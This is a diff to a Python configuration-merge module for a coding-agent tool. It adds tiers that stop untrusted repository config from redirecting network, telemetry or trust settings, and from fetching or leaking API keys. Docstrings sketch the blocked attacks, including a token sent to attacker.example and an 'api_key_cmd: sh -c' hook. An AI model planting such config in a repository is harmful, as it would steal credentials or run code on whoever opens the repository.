@@ -25,6 +25,10 @@ their ``apply`` runs last):
     9. Built-in defaults (from ``Settings.default_dict()`` — seeded
        into the accumulator BEFORE the plan runs)
 
+Two kinds of block step outside that order: ``workspace_trust`` and
+``telemetry`` come only from the organisation (``OrganisationOnlyTier``),
+and ``hooks.group`` only from the developer (``DeveloperOnlyTier``).
+
 Managed sits ABOVE CLI on purpose — the whole point is that a user
 can't override an org policy by adding ``--auto-approve`` on the
 command line.
@@ -35,12 +39,14 @@ from __future__ import annotations
 import logging
 from collections.abc import Callable
 from pathlib import Path
-from typing import TYPE_CHECKING, Any
+from typing import TYPE_CHECKING, Any, ClassVar
 
 from ember_code.core.config.accumulator import SettingsAccumulator
 from ember_code.core.config.cloud_model_migrator import CloudModelMigrator
 from ember_code.core.config.config_io import YamlSource
 from ember_code.core.config.managed_policy import ManagedPolicySource
+from ember_code.core.config.schemas.telemetry import OtlpConfig, TelemetryConfig
+from ember_code.core.layer import Layers
 from ember_code.core.paths import home_config_dir, project_config_dir
 
 if TYPE_CHECKING:
@@ -75,6 +81,174 @@ class YamlTier(Tier):
         return accumulator.merge(self._source.load())
 
 
+class ProjectYamlTier(YamlTier):
+    """A project's YAML file, less the keys a repository may not set.
+
+    A project's ``.igni/config.yaml`` arrives with the repository: anyone
+    who can commit to it writes it. ``network`` says which hosts an
+    air-gapped igni may reach, so a project that could set it could open
+    the air gap for whoever clones it. It comes from the user's file, the
+    group policy or the managed file, and a project's is dropped with a
+    warning rather than merged.
+    """
+
+    #: Top-level keys a project file may not set.
+    #: Keys a repository may not set. A repository's config is whoever
+    #: wrote the repository, so it may neither switch air-gapped mode off,
+    #: name a host igni would then treat as inside the network, nor move
+    #: ``storage.data_dir`` — the organisation's group policy is read from
+    #: under it, so moving it would hide the policy or plant a forged one.
+    #: A dotted key is one field inside a block.
+    _NOT_FROM_A_PROJECT: tuple[str, ...] = (
+        "storage.data_dir",
+        "network",
+        "air_gapped",
+        "api_url",
+        "portal_url",
+        "update_endpoint",
+        "plugins.marketplaces",
+    )
+
+    #: Further keys a project may set only once the folder is trusted
+    #: (``core/workspace_trust``): its permission rules and mode, and the
+    #: safety lists and Bypass guard. An untrusted repository could otherwise
+    #: empty ``safety.blocked_commands``, ``allow: [Bash]`` or start in
+    #: ``bypassPermissions`` for whoever opens it.
+    _ONLY_WHEN_TRUSTED: tuple[str, ...] = ("permissions", "safety")
+
+    def __init__(self, path: Path, *, trusted: Callable[[], bool] | None = None) -> None:
+        super().__init__(path)
+        #: Asked at :meth:`apply` time; ``None`` means trusted (direct
+        #: construction in tests and tooling, which predates trust).
+        self._trusted = trusted
+
+    def apply(self, accumulator: SettingsAccumulator) -> SettingsAccumulator:
+        payload = drop_project_keys(
+            dict(self._source.load()),
+            self._NOT_FROM_A_PROJECT,
+            source=self._source.path,
+            why="only user, group or managed settings may set",
+        )
+        if self._trusted is not None and payload and not self._trusted():
+            payload = drop_project_keys(
+                payload,
+                self._ONLY_WHEN_TRUSTED,
+                source=self._source.path,
+                why="a project may set only once you trust the folder (igni trust)",
+            )
+            payload = self._without_key_sources(payload)
+            return self._without_borrowed_keys(accumulator, payload)
+        return accumulator.merge(payload)
+
+    #: A model entry's fields that fetch or hold its key.
+    _KEY_FIELDS: tuple[str, ...] = ("api_key", "api_key_env", "api_key_cmd")
+    #: A model entry's fields that say where its requests go.
+    _ENDPOINT_FIELDS: tuple[str, ...] = ("url", "provider")
+
+    def _without_key_sources(self, payload: dict[str, Any]) -> dict[str, Any]:
+        """``payload`` less each model's ``api_key_cmd`` and ``api_key_env``, for an untrusted folder.
+
+        ``api_key_cmd`` is a program igni runs to fetch a key when it builds
+        the model. From a repository nobody has trusted yet it is the
+        repository's code, run by opening it: ``api_key_cmd: sh -c '…'`` in
+        a cloned ``.igni/config.yaml``. Found by the bandit lint (S603).
+
+        ``api_key_env`` runs nothing, but it reads any variable of the
+        person's environment and sends it, as the key, to the entry's
+        ``url`` — which the same file names: ``api_key_env: GITHUB_TOKEN``
+        and ``url: https://attacker.example/v1`` (B28). Both wait until the
+        folder is trusted. A literal ``api_key`` is the repository's own
+        string, nobody else's secret, so it stays.
+        """
+        models = payload.get("models")
+        if not isinstance(models, dict):
+            return payload
+        registry = models.get("registry")
+        if not isinstance(registry, dict):
+            return payload
+        dropped = ("api_key_cmd", "api_key_env")
+        refused = {
+            name: sorted(k for k in dropped if k in entry)
+            for name, entry in registry.items()
+            if isinstance(entry, dict) and any(k in entry for k in dropped)
+        }
+        if not refused:
+            return payload
+        logger.warning(
+            "%s sets %s; a project's api_key_cmd runs a program and its api_key_env "
+            "sends a variable of your environment to the URL it names, so they are "
+            "ignored until you trust the folder (igni trust).",
+            self._source.path,
+            ", ".join(f"{', '.join(keys)} for {name}" for name, keys in sorted(refused.items())),
+        )
+        cleaned = {
+            name: (
+                {k: v for k, v in entry.items() if k not in dropped} if name in refused else entry
+            )
+            for name, entry in registry.items()
+        }
+        return {**payload, "models": {**models, "registry": cleaned}}
+
+    def _without_borrowed_keys(
+        self, accumulator: SettingsAccumulator, payload: dict[str, Any]
+    ) -> SettingsAccumulator:
+        """Merge an untrusted ``payload``; a model it re-points keeps no key from below.
+
+        The merge is deep, so a project entry that sets only ``url`` for a
+        model the person's own config defines kept that config's
+        ``api_key`` (or ``api_key_env``, ``api_key_cmd``, ``cloud_token``)
+        and sent it to the project's host (B28). When an untrusted project
+        changes where a model's requests go, the entry's key comes from
+        the project or from nowhere.
+        """
+        merged = accumulator.merge(payload)
+        project_registry = (payload.get("models") or {}).get("registry")
+        below = (accumulator.payload.get("models") or {}).get("registry")
+        if not isinstance(project_registry, dict) or not isinstance(below, dict):
+            return merged
+        borrowed: list[str] = []
+        registry = dict(merged.payload["models"]["registry"])
+        for name, entry in project_registry.items():
+            lower = below.get(name)
+            if not (isinstance(entry, dict) and isinstance(lower, dict)):
+                continue
+            repointed = any(f in entry and entry[f] != lower.get(f) for f in self._ENDPOINT_FIELDS)
+            inherited = [k for k in self._KEY_FIELDS if k in lower and k not in entry]
+            if repointed and inherited:
+                borrowed.append(name)
+                registry[name] = {k: v for k, v in registry[name].items() if k not in inherited}
+        if not borrowed:
+            return merged
+        logger.warning(
+            "%s points %s at a different endpoint; the key your own config gives "
+            "%s is not sent there. Trust the folder (igni trust) to allow it.",
+            self._source.path,
+            ", ".join(sorted(borrowed)),
+            "it" if len(borrowed) == 1 else "them",
+        )
+        models = {**merged.payload["models"], "registry": registry}
+        return SettingsAccumulator(payload={**merged.payload, "models": models})
+
+
+def drop_project_keys(
+    payload: dict[str, Any], keys: tuple[str, ...], *, source: Path, why: str
+) -> dict[str, Any]:
+    """``payload`` less ``keys`` (a dotted key is one field in a block), with a warning."""
+    refused: list[str] = []
+    for key in keys:
+        block, _, field = key.partition(".")
+        if not field:
+            if key in payload:
+                refused.append(key)
+                payload = {k: v for k, v in payload.items() if k != key}
+        elif isinstance(payload.get(block), dict) and field in payload[block]:
+            refused.append(key)
+            payload = {**payload, block: {k: v for k, v in payload[block].items() if k != field}}
+    if refused:
+        logger.warning("%s sets %s, which %s; ignored.", source, ", ".join(refused), why)
+    return payload
+
+
 class JsonFragmentTier(Tier):
     """A CC-style ``settings.json`` file — only whitelisted top-level
     keys are lifted into the accumulator. Silently no-ops on missing
@@ -88,6 +262,104 @@ class JsonFragmentTier(Tier):
         if result.ok and result.data:
             return accumulator.merge(result.data)
         return accumulator
+
+
+class ProjectJsonFragmentTier(JsonFragmentTier):
+    """A project's ``settings.json`` / ``settings.local.json``.
+
+    The lifted keys are ``permissions`` only, so an untrusted folder's file
+    contributes nothing: see :attr:`ProjectYamlTier._ONLY_WHEN_TRUSTED`.
+    """
+
+    def __init__(self, path: Path, *, trusted: Callable[[], bool] | None = None) -> None:
+        super().__init__(path)
+        self._trusted = trusted
+
+    def apply(self, accumulator: SettingsAccumulator) -> SettingsAccumulator:
+        result = ManagedPolicySource.load_json_fragment(self._path)
+        if not (result.ok and result.data):
+            return accumulator
+        payload = dict(result.data)
+        if self._trusted is not None and not self._trusted():
+            payload = drop_project_keys(
+                payload,
+                ProjectYamlTier._ONLY_WHEN_TRUSTED,
+                source=self._path,
+                why="a project may set only once you trust the folder (igni trust)",
+            )
+        return accumulator.merge(payload) if payload else accumulator
+
+
+class OrganisationOnlyTier(Tier):
+    """A settings block that comes from the organisation, never from below it.
+
+    Runs after the CLI tier and before the group and managed tiers: whatever
+    the user's config, a project's or the command line said is put back to the
+    defaults, and only the group policy pack, the managed file and the
+    environment (applied by the block's own model) can set it. Subclasses name
+    the block and how to build its defaults.
+    """
+
+    #: The top-level settings key.
+    BLOCK: ClassVar[str]
+
+    def defaults(self) -> dict[str, Any]:
+        """The block's defaults, without its environment."""
+        raise NotImplementedError
+
+    def apply(self, accumulator: SettingsAccumulator) -> SettingsAccumulator:
+        defaults = self.defaults()
+        payload = dict(accumulator.payload)
+        block = payload.get(self.BLOCK)
+        if isinstance(block, dict) and any(
+            key in defaults and block[key] != defaults[key] for key in block
+        ):
+            logger.warning(
+                "%s may be set only in the managed-settings file, the group policy or "
+                "the environment; the value from user, project or CLI settings is ignored.",
+                self.BLOCK,
+            )
+        payload[self.BLOCK] = defaults
+        return SettingsAccumulator(payload=payload)
+
+
+class WorkspaceTrustTier(OrganisationOnlyTier):
+    """``workspace_trust`` comes from the organisation, never from below it.
+
+    The environment may only tighten it (``WorkspaceTrustConfig``). A
+    repository that could set this could trust itself; a person who could set
+    it could opt out of their organisation's rule.
+    """
+
+    BLOCK = "workspace_trust"
+
+    def defaults(self) -> dict[str, Any]:
+        from ember_code.core.config.schemas.workspace_trust import WorkspaceTrustConfig
+
+        return WorkspaceTrustConfig.model_construct().model_dump()
+
+
+class TelemetryTier(OrganisationOnlyTier):
+    """``telemetry`` (the OTLP collector) comes from the organisation.
+
+    A repository that could set it could send whoever opens it's traces to a
+    host of the repository's choosing, and with ``capture_content`` their
+    prompts and code; a person could do the same to their organisation. The
+    ``OTEL_*`` environment fills what the organisation left unset
+    (``OtlpConfig``).
+    """
+
+    BLOCK = "telemetry"
+
+    def defaults(self) -> dict[str, Any]:
+        return TelemetryConfig.model_construct(otlp=OtlpConfig.model_construct()).model_dump()
+
+
+#: A permission field's tightest value, where it is not ``"deny"``: what the
+#: command line set that a group may not loosen. ``--read-only`` sets
+#: ``read_only: true``, and a group's ``read_only: false`` would otherwise
+#: have switched it off.
+_TIGHTEST: dict[str, object] = {"read_only": True}
 
 
 class CliTier(Tier):
@@ -111,6 +383,10 @@ class CliTier(Tier):
     #: this" are different facts, and only the first is a ratchet.
     denied_by_cli: frozenset[str] = frozenset()
 
+    #: ``hooks.group`` as the command line set it (``--strict`` sets
+    #: ``ask``), or ``None``. Read by :class:`DeveloperOnlyTier`.
+    hooks_group: str | None = None
+
     def apply(self, accumulator: SettingsAccumulator) -> SettingsAccumulator:
         if self._overrides is None:
             return accumulator
@@ -125,8 +401,10 @@ class CliTier(Tier):
 
         permissions = payload.get("permissions") or {}
         self.denied_by_cli = frozenset(
-            field for field, value in permissions.items() if value == "deny"
+            field for field, value in permissions.items() if value == _TIGHTEST.get(field, "deny")
         )
+        hooks = payload.get("hooks")
+        self.hooks_group = hooks.get("group") if isinstance(hooks, dict) else None
         return accumulator.merge(payload)
 
 
@@ -160,8 +438,138 @@ class ManagedTier(Tier):
         return accumulator.merge(YamlSource(path).load())
 
 
+class ManagedOnlyTier(Tier):
+    """Settings only the managed-settings file (or the environment) may set.
+
+    ``group_policy.trusted_keys`` and ``group_policy.required`` decide whether
+    the organisation's group policy is enforced at all. Whoever could set
+    them could pin a key of their own, or make an unusable pack harmless —
+    so a value from the user's config, a project's, the CLI or the group
+    pack itself is discarded here, and only the managed file's survives.
+    The environment (``IGNI_GROUP_POLICY_TRUSTED_KEYS``,
+    ``IGNI_GROUP_POLICY_REQUIRED``) is applied afterwards by
+    ``GroupPolicyConfig`` — it is a deployment's decision, made where the
+    process is started.
+
+    Runs after :class:`ManagedTier`, reading the same file through the same
+    path provider.
+    """
+
+    #: ``group_policy`` fields only the managed file may set.
+    FIELDS: tuple[str, ...] = ("trusted_keys", "required")
+
+    def __init__(
+        self,
+        path_provider: Callable[[], Path | None] = ManagedPolicySource.platform_path,
+    ) -> None:
+        self._path_provider = path_provider
+
+    @classmethod
+    def managed_values(cls, path_provider: Callable[[], Path | None]) -> dict[str, Any]:
+        """What the managed file sets of :attr:`FIELDS`, and nothing else."""
+        path = path_provider()
+        payload = YamlSource(path).load() if path is not None else {}
+        block = payload.get("group_policy") if isinstance(payload, dict) else None
+        if not isinstance(block, dict):
+            return {}
+        return {field: block[field] for field in cls.FIELDS if field in block}
+
+    def apply(self, accumulator: SettingsAccumulator) -> SettingsAccumulator:
+        from ember_code.core.config.schemas.storage_and_paths import GroupPolicyConfig
+
+        managed = self.managed_values(self._path_provider)
+        defaults = GroupPolicyConfig.model_construct().model_dump()
+        payload = dict(accumulator.payload)
+        block = dict(payload.get("group_policy") or {})
+        refused = [
+            field
+            for field in self.FIELDS
+            if field not in managed and field in block and block[field] != defaults[field]
+        ]
+        if refused:
+            logger.warning(
+                "group_policy.%s may be set only in the managed-settings file or the "
+                "environment; the value from user, project, CLI or group settings is ignored.",
+                ", group_policy.".join(refused),
+            )
+        for field in self.FIELDS:
+            block[field] = managed.get(field, defaults[field])
+        payload["group_policy"] = block
+        return SettingsAccumulator(payload=payload)
+
+
+class DeveloperOnlyTier(Tier):
+    """Settings only the developer may set: their own config and their command line.
+
+    The mirror of :class:`OrganisationOnlyTier`. ``hooks.group`` decides
+    whether the hooks an organisation's group policy ships run on this
+    machine. Those hooks run ``bash -c`` outside the agent's permissions, and
+    the person a developer needs protecting from there is whoever administers
+    the organisation — who writes the group policy, and may well write the
+    managed file too. So the group pack, the managed file and a project's
+    config (whoever wrote the repository) cannot set it: a value from any of
+    them is discarded, with a warning, and what stands is the stricter of
+    ``~/.igni/config.yaml`` and the command line (``--strict`` means
+    ``ask``).
+
+    Runs after every tier that could have set it.
+    """
+
+    #: ``(block, field)`` for each developer-only setting.
+    FIELDS: tuple[tuple[str, str], ...] = (("hooks", "group"),)
+
+    def __init__(self, user_config: Path | None, cli_tier: CliTier | None = None) -> None:
+        #: ``~/.igni/config.yaml``, or ``None`` where this layer reads no
+        #: local settings (the cloud's).
+        self._user_config = user_config
+        self._cli_tier = cli_tier
+
+    def _user_value(self) -> str | None:
+        from ember_code.core.config.schemas.orchestration import GROUP_HOOK_MODES
+
+        if self._user_config is None:
+            return None
+        block = YamlSource(self._user_config).load().get("hooks")
+        value = block.get("group") if isinstance(block, dict) else None
+        if value is not None and value not in GROUP_HOOK_MODES:
+            logger.warning(
+                "%s sets hooks.group to %r; it must be one of %s. Using 'ask'.",
+                self._user_config,
+                value,
+                ", ".join(GROUP_HOOK_MODES),
+            )
+            # A typo in a safety setting is read as the cautious middle,
+            # not as the permissive default.
+            return "ask"
+        return value
+
+    def apply(self, accumulator: SettingsAccumulator) -> SettingsAccumulator:
+        from ember_code.core.config.schemas.orchestration import GROUP_HOOK_MODES
+
+        chosen = [
+            v
+            for v in (self._user_value(), self._cli_tier.hooks_group if self._cli_tier else None)
+            if v in GROUP_HOOK_MODES
+        ]
+        value = max(chosen, key=GROUP_HOOK_MODES.index, default="run")
+
+        payload = dict(accumulator.payload)
+        block = dict(payload.get("hooks") or {})
+        if "group" in block and block["group"] != value:
+            logger.warning(
+                "hooks.group may be set only in your own ~/.igni/config.yaml or on the "
+                "command line; %r from a project, the group policy or the managed file "
+                "is ignored, and %r stands.",
+                block["group"],
+                value,
+            )
+        block["group"] = value
+        payload["hooks"] = block
+        return SettingsAccumulator(payload=payload)
+
+
 class CloudMigrationTier(Tier):
-    """Override Ember Cloud rows with the shipping defaults so users
+    """Override igni server rows with the shipping defaults so users
     always get the latest model after upgrading. Runs after the
     other tiers so a fresh migration is visible in the final
     :class:`Settings`.
@@ -184,7 +592,7 @@ class CloudMigrationTier(Tier):
 
 
 class GroupPolicyTier(Tier):
-    """Org-group policy overrides — fetched from ember-server, cached locally.
+    """Org-group policy overrides — fetched from igni server, cached locally.
 
     Sits ABOVE CliTier (group-defined settings beat user CLI flags) and
     BELOW ManagedTier (sysadmin file still wins over any org policy).
@@ -212,6 +620,41 @@ class GroupPolicyTier(Tier):
     Everything else a group sets still wins over the CLI. This is a
     ratchet on ``permissions`` denies specifically, not a general
     reversal of precedence.
+
+    ## Where the fetcher comes from
+
+    :meth:`SettingsMergePlan.default` only appends the tier when it is handed
+    a ``group_policy_fetcher``, and for a long time no production caller
+    passed one — the tier was written, correct, and unreached, so an admin
+    publishing ``{"permissions": {"web_fetch": "deny"}}`` believed it was enforced
+    and it was not.
+
+    Production now passes
+    :class:`~ember_code.core.config.group_policy.CachedSettingsFetcher`, from
+    the two places that build a real ``Settings``: ``BackendApp.run`` (the
+    backend process every window talks to) and ``load_settings_from_options``
+    (the ``igni -m`` / pipe path, which runs a session in-process). Both build
+    exactly one per process.
+
+    That fetcher reads the pack the last refresh left on disk rather than
+    calling the portal, because a settings load runs before this process holds
+    a bearer token. The fetch lives in ``AuthController._hydrate_group_policy``
+    — cold start, login, and every ``group_policy.poll_seconds`` — and the read
+    lives here; see :class:`CachedSettingsFetcher` for what that split buys and
+    what it costs.
+
+    ## Only a pack igni server signed
+
+    The cache is a directory the user can write, so what the fetcher reads is
+    trusted only as far as igni server's signature on it: the pack is stored
+    exactly as signed (``pack.jws``) and verified — signature, ``iss`` against
+    ``api_url``, ``sub`` against the person signed in, no rollback — before it
+    reaches this tier. An unusable pack is never merged; with the managed-only
+    ``group_policy.required`` the fetcher raises instead. See
+    ``core/config/group_policy_signature.py`` and :class:`ManagedOnlyTier`.
+
+    Tests and one-off migrations still pass their own fetcher, and a plan built
+    without one skips the tier entirely.
     """
 
     def __init__(
@@ -240,7 +683,7 @@ class GroupPolicyTier(Tier):
             permissions = dict(payload.get("permissions") or {})
             for field in sorted(denied):
                 attempted = permissions.get(field)
-                if attempted is not None and attempted != "deny":
+                if attempted is not None and attempted != _TIGHTEST.get(field, "deny"):
                     self.refused_loosening[field] = str(attempted)
                     # Drop the key rather than writing 'deny' back: the
                     # accumulator already holds the CLI's deny, and
@@ -296,6 +739,7 @@ class SettingsMergePlan:
         defaults_models: ModelsConfig,
         managed_path_provider: Callable[[], Path | None] = ManagedPolicySource.platform_path,
         group_policy_fetcher: Callable[[], GroupPolicyPack | None] | None = None,  # type: ignore[name-defined]
+        project_trusted: Callable[[], bool] | None = None,
     ) -> SettingsMergePlan:
         """Build the standard 7-tier plan from filesystem paths.
 
@@ -304,6 +748,11 @@ class SettingsMergePlan:
         both the loader docstring and the test-suite precedence
         assertions reference this method's output. If a future
         refactor needs to reorder tiers, this is the seam.
+
+        ``project_trusted`` says whether the folder is trusted
+        (``core/workspace_trust``); an untrusted folder's config may not set
+        ``permissions`` or ``safety``. Left ``None``, the process's
+        :class:`~ember_code.core.workspace_trust.WorkspaceTrust` is asked.
         """
         # Through the helpers, not ``/ CONFIG_DIR`` — they fall back to
         # the pre-rename directory while that is the one on disk. Built
@@ -315,24 +764,51 @@ class SettingsMergePlan:
         if project_dir is None:
             project_dir = Path.cwd()
         project_ember = project_config_dir(project_dir)
+        if project_trusted is None:
+            folder = project_dir
+
+            def project_trusted() -> bool:
+                from ember_code.core.workspace_trust import WorkspaceTrust
+
+                return WorkspaceTrust.shared().is_trusted(
+                    folder, what="permission and safety settings"
+                )
 
         # Built ahead of the list: ``GroupPolicyTier`` needs the same
         # instance, because the ratchet reads what this one actually set.
         cli_tier = CliTier(cli)
 
+        # A layer may read no settings file of its own — not the user's
+        # under ``~/.igni``, not the workspace's ``.igni`` (the cloud's:
+        # what it runs with comes from the image and from igni server).
+        local_tiers: list[Tier] = (
+            []
+            if not Layers.current().reads_local_settings()
+            else [
+                # User global (lowest priority above built-in defaults)
+                YamlTier(user_ember / "config.yaml"),
+                JsonFragmentTier(user_ember / "settings.json"),
+                JsonFragmentTier(user_ember / "settings.local.json"),
+                # Project (committed). An untrusted folder's ``permissions``
+                # and ``safety`` are dropped (``core/workspace_trust``).
+                ProjectYamlTier(project_ember / "config.yaml", trusted=project_trusted),
+                ProjectJsonFragmentTier(project_ember / "settings.json", trusted=project_trusted),
+                # Project local (gitignored)
+                ProjectYamlTier(project_ember / "config.local.yaml", trusted=project_trusted),
+                ProjectJsonFragmentTier(
+                    project_ember / "settings.local.json", trusted=project_trusted
+                ),
+            ]
+        )
         tiers: list[Tier] = [
-            # User global (lowest priority above built-in defaults)
-            YamlTier(user_ember / "config.yaml"),
-            JsonFragmentTier(user_ember / "settings.json"),
-            JsonFragmentTier(user_ember / "settings.local.json"),
-            # Project (committed)
-            YamlTier(project_ember / "config.yaml"),
-            JsonFragmentTier(project_ember / "settings.json"),
-            # Project local (gitignored)
-            YamlTier(project_ember / "config.local.yaml"),
-            JsonFragmentTier(project_ember / "settings.local.json"),
+            *local_tiers,
             # CLI
             cli_tier,
+            # ``workspace_trust`` back to its defaults: only the organisation
+            # tiers below (and the environment) may set it.
+            WorkspaceTrustTier(),
+            # ``telemetry`` likewise: where traces go is the organisation's call.
+            TelemetryTier(),
             # Org-group policy — wins over CLI, loses to sysadmin
             # ManagedPolicy. Handed the CLI tier so it can honour the deny
             # ratchet: a group tightens freely but cannot loosen a
@@ -345,6 +821,16 @@ class SettingsMergePlan:
             ),
             # Managed policy — last, so it wins over CLI and group policy.
             ManagedTier(path_provider=managed_path_provider),
+            # The settings that decide whether group policy is enforced at
+            # all: from the managed file (or the environment), or not at all.
+            ManagedOnlyTier(path_provider=managed_path_provider),
+            # And the settings only the developer may set — ``hooks.group``,
+            # whether the group's hooks run here: from their own config and
+            # command line, whatever the tiers above said.
+            DeveloperOnlyTier(
+                user_ember / "config.yaml" if local_tiers else None,
+                cli_tier=cli_tier,
+            ),
             # Migration — replaces cloud rows with shipping defaults.
             CloudMigrationTier(defaults=defaults_models),
         ]
